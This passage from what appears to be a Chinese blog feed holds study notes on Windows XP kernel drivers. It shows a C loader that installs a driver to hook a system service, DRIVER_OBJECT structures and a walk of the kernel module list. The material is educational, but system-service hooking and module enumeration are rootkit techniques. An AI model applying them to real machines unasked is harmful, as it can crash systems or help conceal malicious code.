class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建设备失败. %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 要HOOK的系统服务号</span></span><br><span class="line">	BYTE InBuffer[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD OutBuffer;</span><br><span class="line">	DWORD dwOut = <span class="number">0</span>;</span><br><span class="line">	DeviceIoControl(hDevice,OPHOOK,InBuffer,<span class="number">4</span>,&amp;OutBuffer,<span class="number">4</span>,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;从0环的返回码：%d\n&quot;</span>,OutBuffer);</span><br><span class="line">	<span class="keyword">if</span>(OutBuffer == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;HOOK成功.\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;HOOK失败.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnLoadDriver</span><span class="params">(PCWSTR lpszDriverName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SC_HANDLE hServiceMgr = OpenSCManagerW(<span class="number">0</span>,<span class="number">0</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	SC_HANDLE hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	SERVICE_STATUS SvrStatus;</span><br><span class="line">	ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrStatus);</span><br><span class="line">	DeleteService(hServiceDDK);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	DWORD bRet;</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;UnHook失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	DeviceIoControl(hDevice,OPUNHOOK,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>,&amp;bRet,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// win32k.sys系统服务表挂物理页，没有这行在0环的代码可能会使电脑蓝屏</span></span><br><span class="line">	HWND hwnd = FindWindowA(<span class="literal">NULL</span>,<span class="string">&quot;notepad.exe&quot;</span>); </span><br><span class="line">	<span class="keyword">if</span> (!LoadDriver(DRIVER_NAME, DRIVER_PATH))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;加载驱动失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;本程序仅用于XP 32bit环境，Sys驱动请放到和本程序相同的目录下，且不要改驱动文件名！\n按回车开始HOOK...\n&quot;</span>);</span><br><span class="line">	RunHOOKDriver();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按回车开始卸载UNHOOK...\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	UnHook();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按回车开始卸载HOOK...\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	UnLoadDriver(DRIVER_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/03/16/HFfVG2seUBq7ZOA.png" alt="25.png"></p>
<p>⚠️注意事项：</p>
<ol>
<li><p>在3环程序中，驱动名称<code>DRIVER_NAME</code>和驱动路径<code>DRIVER_PATH</code>名称都要是<code>.sys</code>的名称。</p>
</li>
<li><p>3环的加载程序需要和<code>.sys</code>驱动程序在同一目录下。</p>
</li>
<li><p>3环程序在多次调试后可能会失败卸载驱动，导致<code>StartService()</code>失败，<code>GetLastError()</code>得到<a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-">错误码</a>是2，此时需要用<code>KmdManager.exe</code>对驱动进行卸载。</p>
<p><img data-src="https://s2.loli.net/2022/03/16/lSWoY7TKGIrNU1i.png" alt="26.png"></p>
</li>
<li><p>在VC直接F7、F5运行3环的加载程序可能会一闪而过，这个时候需要在该程序的目录下双击运行该程序（需要先执行步骤3进行卸载再双击）。</p>
</li>
</ol>
<p>注意驱动的调用进程：</p>
<p><img data-src="https://s2.loli.net/2022/03/16/NXGPHqr6nmKhU2S.png" alt="27.png"></p>
<p>上述程序说明，驱动加载后，执行驱动入口代码时，所属进程是系统进程。这和 DeviceIoControl 时情况又有所不同，DeviceIoControl 通信时，所属进程是发起通信的3环程序。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>API调用</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
        <tag>系统调用</tag>
        <tag>API调用</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 驱动开发（二）</title>
    <url>/post/WinXP-Driver2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="0-驱动相关对象"><a href="#0-驱动相关对象" class="headerlink" title="0 驱动相关对象"></a>0 驱动相关对象</h2><p>驱动通信：</p>
<p>《Windows内核安全与驱动开发》 2.3、2.5、5、10.3.5、13.3、<strong>16.5、16.6</strong></p>
<p>看雪的那两片驱动开发的文章</p>
<p>《内核原理与实现》6</p>
<p>《内核情景分析》 9</p>
<p>《驱动开发详解》 1 4 7 </p>
<h3 id="01-驱动对象"><a href="#01-驱动对象" class="headerlink" title="01 驱动对象"></a>01 驱动对象</h3><div class="note warning"><p>一个<strong>驱动对象</strong>代表了<strong>一个驱动程序</strong>，或者说一个<strong>内核模块</strong>。</p>
</div>

<p>内核对象结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PVOID DriverStart;			<span class="comment">//这个内核模块在内核空间中的开始地址</span></span><br><span class="line">    ULONG DriverSize;			<span class="comment">//这个内核模块在内核空间中的大小</span></span><br><span class="line">    PVOID DriverSection;		<span class="comment">//内核模块链表,指向当前模块的_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;	<span class="comment">//驱动的扩展信息，可以自定义存放我们的数据（非分页内存，不会被换页，当全局变量用）</span></span><br><span class="line">    UNICODE_STRING DriverName;		<span class="comment">//驱动的名字</span></span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;	<span class="comment">//快速 IO 分发函数</span></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;	<span class="comment">//驱动的卸载地址</span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];	<span class="comment">//普通分发函数</span></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span> </span><br></pre></td></tr></table></figure>

<p>Windbg查看结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT -v</span><br><span class="line">nt!_DRIVER_OBJECT</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span>, 15 <span class="title">elements</span>, 0<span class="title">xa8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x000</span> <span class="title">Type</span>             :</span> Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_OBJECT</span>, 25 <span class="title">elements</span>, 0<span class="title">xb8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x008</span> <span class="title">Flags</span>            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 to Void</span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 to Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_EXTENSION</span>, 6 <span class="title">elements</span>, 0<span class="title">x1c</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x01c</span> <span class="title">DriverName</span>       :</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>, 3 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x024</span> <span class="title">HardwareDatabase</span> :</span> Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>, 3 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x028</span> <span class="title">FastIoDispatch</span>   :</span> Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">FAST_IO_DISPATCH</span>, 28 <span class="title">elements</span>, 0<span class="title">x70</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x02c</span> <span class="title">DriverInit</span>       :</span> Ptr32 to     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32 to     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32 to     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32 to     <span class="keyword">long</span> </span><br></pre></td></tr></table></figure>



<h3 id="02-设备对象"><a href="#02-设备对象" class="headerlink" title="02 设备对象"></a>02 设备对象</h3><p>一个驱动程序可以支持多个设备，所以，驱动程序对象中有一个链表记录了它所负责的所有设备对象。每个设备对象都必定有一个为它负责的驱动程序对设备对象的各种操作实际上是由为它负贵的驱动程序中的例程来完成的。</p>
<h2 id="1-内核空间"><a href="#1-内核空间" class="headerlink" title="1 内核空间"></a>1 内核空间</h2><p>每个进程的低2G都是独立的，而<strong>高2G是共享的</strong>。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/t3rlcvWyaSmH2Go.png" alt="7.png"></p>
<h3 id="1-1-练习：验证高2G内存共享"><a href="#1-1-练习：验证高2G内存共享" class="headerlink" title="1.1 练习：验证高2G内存共享"></a>1.1 练习：验证高2G内存共享</h3><ol>
<li><p>先在驱动程序中定义一个全局变量，获取地址（高2G）。地址为：0xF79F9014。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ULONG ulNum = <span class="number">12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;变量ulNum的地址为：[%p]:%08d\n&quot;</span>,&amp;ulNum,ulNum);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/15/24hLcEGk73zmvIU.png" alt="8.png"></p>
</li>
<li><p>在Windbg使用<code>!process 0 0</code>找任意一个进程的基地址，如DbgView：0x85d9b8d8 ，并使用<code>.process 0x85d9b8d8</code>切换到该进程空间。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/ABvWtlupIbPMjQq.png" alt="9.png"></p>
</li>
<li><p>如下图，得到地址0xF79F9014中值为：0x00bc614e（12345678）。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/gMmRX8V31irBolG.png" alt="10.png"></p>
</li>
</ol>
<h3 id="1-2-内核模块"><a href="#1-2-内核模块" class="headerlink" title="1.2 内核模块"></a>1.2 内核模块</h3><p>高2G里有许多模块，操作系统内核（如101012分页的ntoskrnl.exe）也在其中。接下来的课后试验我们会编程遍历高2G模块。</p>
<p>内核模块一般是<code>.sys</code>，也可以是其他格式，他们都遵循PE格式。我们经常说“驱动”，这个名字的来源其实是内核程序入口函数的参数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>PDRIVER_OBJECT</code>驱动对象，就是驱动这个名字的由来。</p>
<ul>
<li><code>driver</code>：指向当前模块的DRIVER_OBJECT。</li>
<li><code>reg_path</code>：将当前模块注册到注册表哪个位置。</li>
</ul>
<ol>
<li><p>硬件种类繁多，不可能做一个兼容所有硬件的内核，所以，微软提供规定的接口格式，让硬件驱动人员安装规定的格式编写“驱动程序” 。</p>
</li>
<li><p>这些驱动程序每一个都是一个模块，称为“内核模块”，都可以加载到内核中，都遵守PE结构。但本质上讲，任意一个<code>.sys</code>文件与内核文件没有区别。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/6jAEl5kP7TI1gGO.png" alt="11.png"></p>
</li>
</ol>
<h3 id="1-3-DRIVER-OBJECT-结构体"><a href="#1-3-DRIVER-OBJECT-结构体" class="headerlink" title="1.3 DRIVER_OBJECT 结构体"></a>1.3 DRIVER_OBJECT 结构体</h3><p>DRIVER_OBJECT为一个结构体，<strong>每个内核模块都有一个这样对应的结构体，来描述这个模块在内核中的：位置、大小、名称等等</strong>。</p>
<div class="note warning"><p>结构体DRIVER_OBJECT主要目的就是描述当前的这个模块，或者叫做驱动对象。</p>
<p><mark class="label danger">模块</mark>：<strong>驱动对象</strong>。</p>
</div>

<p>该结构在VS2010的<code>wdm.h</code>及<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object#:~:text=Each%20driver%20object%20represents%20the%20image%20of%20a,if%20any.%20A%20driver%20object%20is%20partially%20opaque.">MSDN</a>中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PVOID DriverStart;			<span class="comment">//驱动对象的起始地址</span></span><br><span class="line">    ULONG DriverSize;			<span class="comment">//驱动对象的大小</span></span><br><span class="line">    PVOID DriverSection;		<span class="comment">//内核模块链表,指向当前模块的_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;	<span class="comment">//驱动的扩展信息，可以自定义存放我们的数据（非分页内存，不会被换页，当全局变量用）</span></span><br><span class="line">    UNICODE_STRING DriverName;		<span class="comment">//驱动对象的名字</span></span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;	<span class="comment">//驱动对象的卸载地址</span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span> </span><br></pre></td></tr></table></figure>

<p>几个重要的属性：</p>
<p>DriverStart：驱动在内存中的基址。<br>DriverSize：驱动在内存中的大小。<br><strong>DriverSection</strong>：内核模块链表基址。<code>_LDR_DATA_TABLE_ENTRY</code><br>DriverName：驱动（模块）名称。</p>
<p>在Windbg中查看该结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B	<span class="comment">//2B = 2Byte(SHORT)</span></span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void	<span class="comment">//Ptr32：32位的指针类型</span></span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32     <span class="keyword">long</span> </span><br></pre></td></tr></table></figure>

<p>获取当前驱动入口函数第一个参数PDRIVER_OBJECT的值（是一个结构体指针）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	DbgPrint(<span class="string">&quot;PDRIVER_OBJECT: %08X,%wZ\n&quot;</span>,driver,reg_path);</span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DbgPrint输出格式可参见：<a href="https://blog.csdn.net/qq750509600/article/details/79630453">DbgPrint输出格式</a></p>
<ul>
<li>%Z ：ANSI_STRING字符串，注意输出时需要用<code>&amp;</code>取字符串的地址。</li>
<li>%wZ：UNICODE_STRING字符串，注意输出时需要用<code>&amp;</code>取字符串的地址。</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/01/15/NtnP37CxT65okGB.png" alt="12.png"></p>
<p>如图，结构体_DRIVER_OBJECT的起始地址为：0x85EA8BC0。在windbg中查看这个驱动进程的 _DRIVER_OBJECT 结构体：<code>dt _DRIVER_OBJECT 85EA8BC0</code></p>
<p>指令： dt _DRIVER_OBJECT  地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT <span class="number">85</span>EA8BC0</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : <span class="number">0</span>n4</span><br><span class="line">   +<span class="number">0x002</span> Size             : <span class="number">0</span>n168</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : (null) </span><br><span class="line">   +<span class="number">0x008</span> Flags            : <span class="number">0x12</span></span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : <span class="number">0xf789e000</span> Void</span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : <span class="number">0x6000</span></span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : <span class="number">0x863064b0</span> Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : <span class="number">0x85ea8c68</span> _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING <span class="string">&quot;\Driver\0115_2_输出参数PDRIVER_OBJECT&quot;</span></span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : <span class="number">0x8067e260</span> _UNICODE_STRING <span class="string">&quot;\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM&quot;</span></span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : (null) </span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : <span class="number">0xf789f020</span>     <span class="keyword">long</span>  <span class="number">0115</span>_2_!DriverEntry+<span class="number">0</span></span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : (null) </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : <span class="number">0xf789f000</span>     <span class="keyword">void</span>  <span class="number">0115</span>_2_!DriverUnload+<span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] <span class="number">0x804f5552</span>     <span class="keyword">long</span>  nt!IopInvalidDeviceRequest+<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-遍历内核模块"><a href="#1-4-遍历内核模块" class="headerlink" title="1.4 遍历内核模块"></a>1.4 遍历内核模块</h3><p>我们可以根据_DRIVER_OBJECT结构的DriverSection（内核模块链表）属性来获取0环所有的内核模块。它实际上是 <code>_LDR_DATA_TABLE_ENTRY</code>结构类型。</p>
<div class="note danger"><p><mark class="label success">双向循环链表</mark></p>
<p><strong>0环所有模块的<code>_LDR_DATA_TABLE_ENTRY</code>是一个双向循环链表</strong>。结构<code>_LDR_DATA_TABLE_ENTRY</code>存储当前模块的信息。</p>
</div>

<p>DriverSection 属性类型为<code>PVOID</code>的链表指针，该指针指向的结构为<strong>当前模块的</strong><code>_LDR_DATA_TABLE_ENTRY</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x034</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : Uint2B</span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : Uint2B</span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : Ptr32 Void</span><br></pre></td></tr></table></figure>

<p>当前模块的DriverSection &#x3D; 0x863064b0，解析当前模块的<code>_LDR_DATA_TABLE_ENTRY</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY HashLinks;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               PVOID SectionPointer;</span><br><span class="line">               ULONG CheckSum;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG TimeDateStamp;</span><br><span class="line">          PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line">     LIST_ENTRY ForwarderLinks;</span><br><span class="line">     LIST_ENTRY ServiceTagLinks;</span><br><span class="line">     LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>



